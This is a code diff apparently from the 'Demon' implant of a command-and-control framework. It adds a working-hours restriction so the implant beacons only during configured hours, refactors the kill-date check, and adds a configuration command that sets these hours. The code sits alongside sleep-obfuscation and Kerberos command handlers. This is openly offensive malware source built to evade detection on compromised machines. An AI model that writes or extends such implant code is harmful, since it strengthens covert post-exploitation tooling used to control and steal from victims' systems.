@@ -68,10 +68,16 @@ VOID CommandDispatcher( VOID )
 
         SleepObf();
 
-        if ( Instance.Config.Transport.KillDate && GetSystemTimeAsUnixTime() >= Instance.Config.Transport.KillDate )
+        if ( ReachedKillDate() )
         {
             PackageDestroy( Package );
-            ReachedKillDate();
+            KillDate();
+        }
+
+        if ( ! InWorkingHours() )
+        {
+            // simply call SleepObf until we reach working hours or the kill date (if set)
+            continue;
         }
 
 #ifdef TRANSPORT_HTTP
@@ -1935,6 +1941,16 @@ VOID CommandConfig( PPARSER Parser )
             break;
         }
 
+        case DEMON_CONFIG_WORKINGHOURS:
+        {
+            Instance.Config.Transport.WorkingHours = ParserGetInt32( Parser );
+
+            PRINTF( "Instance.Config.Transport.WorkingHours => %d\n", Instance.Config.Transport.WorkingHours );
+            PackageAddInt32( Package, Instance.Config.Transport.WorkingHours );
+
+            break;
+        }
+
         default:
             PackageAddInt32( Package, 0 );
             break;
@@ -3042,7 +3058,44 @@ VOID Commandkerberos( PPARSER Parser )
     PackageTransmit( Package, NULL, NULL );
 }
 
-VOID ReachedKillDate( )
+BOOL InWorkingHours( )
+{
+    SYSTEMTIME SystemTime   = { 0 };
+    UINT32     WorkingHours = Instance.Config.Transport.WorkingHours;
+    WORD       StartHour    = 0;
+    WORD       StartMinute  = 0;
+    WORD       EndHour      = 0;
+    WORD       EndMinute    = 0;
+
+    // if WorkingHours is not set, return TRUE
+    if ( ( ( WorkingHours >> 22 ) & 1 ) == 0 )
+        return TRUE;
+
+    StartHour   = ( WorkingHours >> 17 ) & 0b011111;
+    StartMinute = ( WorkingHours >> 11 ) & 0b111111;
+    EndHour     = ( WorkingHours >>  6 ) & 0b011111;
+    EndMinute   = ( WorkingHours >>  0 ) & 0b111111;
+
+    Instance.Win32.GetLocalTime(&SystemTime);
+
+    if ( SystemTime.wHour < StartHour || SystemTime.wHour > EndHour )
+        return FALSE;
+
+    if ( SystemTime.wHour == StartHour && SystemTime.wMinute < StartMinute )
+        return FALSE;
+
+    if ( SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute )
+        return FALSE;
+
+    return TRUE;
+}
+
+BOOL ReachedKillDate()
+{
+    return Instance.Config.Transport.KillDate && GetSystemTimeAsUnixTime() >= Instance.Config.Transport.KillDate;
+}
+
+VOID KillDate( )
 {
     PUTS( "Reached KillDate"  )
 
